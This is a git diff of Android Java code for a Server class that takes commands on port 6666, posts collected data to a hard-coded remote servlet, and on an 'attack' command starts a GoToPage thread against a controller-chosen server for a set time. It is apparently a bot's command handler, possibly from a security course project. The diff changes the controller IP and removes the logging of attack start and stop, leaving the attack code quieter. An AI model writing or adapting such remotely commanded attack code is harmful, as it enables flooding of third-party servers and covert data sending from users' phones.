@@ -24,7 +24,7 @@ import java.util.Enumeration;
 public class Server {
     ServerSocket serverSocket;
     static final int socketServerPORT = 6666;
-    String serverIp = "192.168.1.102";
+    String serverIp = "192.168.1.100";
     String localIp;
     Context context;
     ContentResolver contentResolver;
@@ -158,19 +158,14 @@ public class Server {
                             new Request().execute("http://" + serverIp + ":8080/Csec/Servlet", data.toString());
                         }
                         else if(messageParts[0].equalsIgnoreCase(attackCommand) && messageParts.length > 2){
-                            Log.i(TAGSERVER, "Attack will be started by:");
-                            Log.i(TAGSERVER, messageParts[1]);  //server
-                            Log.i(TAGSERVER, messageParts[2]);  //time
                             goToPage = new GoToPage(messageParts[1], Integer.parseInt(messageParts[2]));
                             goToPage.start();
-                            Log.i(TAGSERVER, "Attack is start successfully");
                         }
                         else if(messageParts[0].equalsIgnoreCase(stopCommand)){
                             if (goToPage != null){
-                                Log.i(TAGSERVER, "Attack will be stopped...");
                                 goToPage.stop();
-                                Log.i(TAGSERVER, "Attack is stopped successfully");
-                            }else{
+                            }
+                            else{
                                 Log.i(TAGSERVER, "Attack cannot be stopped!");
                             }
                         }
